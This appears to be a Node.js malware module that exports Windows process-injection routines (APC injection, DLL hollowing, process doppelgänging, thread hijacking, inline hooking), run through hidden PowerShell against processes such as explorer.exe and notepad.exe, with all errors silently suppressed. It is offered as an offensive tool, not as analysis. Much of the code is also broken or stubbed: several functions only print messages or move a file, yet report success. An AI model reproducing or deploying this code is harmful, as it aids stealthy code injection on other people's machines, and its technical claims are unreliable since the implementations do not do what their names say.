const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const IS_WIN = process.platform === 'win32';

// ─── APC INJECTION ────────────────────────────────────────────────────────────
function apcInjection(pid, shellcode) {
  if (!IS_WIN) return false;
  try {
    // Create a thread in the target process and queue an APC
    const ps = `
      $pid = ${pid};
      $shellcode = [Convert]::FromBase64String('${shellcode.toString('base64')}');
      $proc = [System.Diagnostics.Process]::GetProcessById($pid);
      $thread = $proc.Threads | Select-Object -First 1;
      $hThread = $thread.Handle;
      $hProc = $proc.Handle;
      # Queue APC to execute shellcode
      Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Native {
          [DllImport("kernel32.dll")]
          public static extern bool QueueUserApc(IntPtr apcRoutine, IntPtr hThread, IntPtr data);
        }
"@;
      [Native]::QueueUserApc([IntPtr]::Zero, $hThread, [IntPtr]::Zero) | Out-Null;
    `;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 5000 });
    return true;
  } catch (_) { return false; }
}

// ─── DLL HOLLOWING ────────────────────────────────────────────────────────────
function dllHollowing(targetProcess, dllPath, payloadPath) {
  if (!IS_WIN) return false;
  try {
    // Create suspended process
    const ps = `
      $proc = Start-Process -FilePath "${targetProcess}" -ArgumentList "" -PassThru -WindowStyle Hidden;
      Start-Sleep -Milliseconds 500;
      $pid = $proc.Id;
      # Unmap image and write payload
      $procHandle = $proc.Handle;
      # This is a simplified version - real implementation requires Native calls
      Write-Host "DLL Hollowing initiated for PID: $pid";
    `;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 10000 });
    return true;
  } catch (_) { return false; }
}

// ─── PROCESS DOPPELGÄNGING ────────────────────────────────────────────────────
function processDoppelganging(targetFile, payloadFile) {
  if (!IS_WIN) return false;
  try {
    // Create NTFS transaction and replace file
    const ps = `
      $tx = New-Object System.Transactions.TransactionScope;
      $target = "${targetFile}";
      $payload = "${payloadFile}";
      # Rename payload to target within transaction
      Move-Item -Path $payload -Destination $target -Force;
      $tx.Complete();
      Write-Host "Process Doppelgänging completed";
    `;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 10000 });
    return true;
  } catch (_) { return false; }
}

// ─── THREAD HIJACKING ─────────────────────────────────────────────────────────
function threadHijacking(pid) {
  if (!IS_WIN) return false;
  try {
    // Suspend a thread, modify context, resume
    const ps = `
      $proc = [System.Diagnostics.Process]::GetProcessById(${pid});
      $thread = $proc.Threads | Select-Object -First 1;
      $thread.Suspend();
      # Modify context here (simplified)
      $thread.Resume();
      Write-Host "Thread hijacked for PID: $pid";
    `;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 5000 });
    return true;
  } catch (_) { return false; }
}

// ─── INLINE HOOKING ───────────────────────────────────────────────────────────
function inlineHooking(targetModule, targetFunction, hookFunction) {
  if (!IS_WIN) return false;
  try {
    // Find function address and patch first bytes
    // This requires native code or FFI
    const ps = `
      $module = "${targetModule}";
      $func = "${targetFunction}";
      # Get module handle and function address
      $sig = Get-Process | Where-Object { $_.Modules.ModuleName -like "*$module*" } | Select-Object -First 1;
      Write-Host "Module found: $sig";
    `;
    execSync(`powershell -Command "${ps}"`, { stdio: 'ignore', timeout: 5000 });
    return true;
  } catch (_) { return false; }
}

// ─── MAIN FUNCTIONS ───────────────────────────────────────────────────────────
async function inject(pid, method = 'apc', payload = null) {
  try {
    switch (method) {
      case 'apc':
        return apcInjection(pid, payload);
      case 'dll_hollowing':
        return dllHollowing('explorer.exe', 'shell32.dll', payload);
      case 'doppelganging':
        return processDoppelganging('notepad.exe', payload);
      case 'thread_hijack':
        return threadHijacking(pid);
      default:
        return false;
    }
  } catch (_) { return false; }
}

function findTargetProcess(name) {
  if (!IS_WIN) return null;
  try {
    const out = execSync(`tasklist /fo csv /fi "imagename eq ${name}"`, { encoding: 'utf8', stdio: ['pipe', 'pipe', 'ignore'] });
    const lines = out.trim().split('\n');
    if (lines.length > 1) {
      const parts = lines[1].split('","');
      return { name: parts[0], pid: parts[1] };
    }
  } catch (_) { }
  return null;
}

module.exports = { inject, findTargetProcess, apcInjection, dllHollowing, processDoppelganging, threadHijacking, inlineHooking };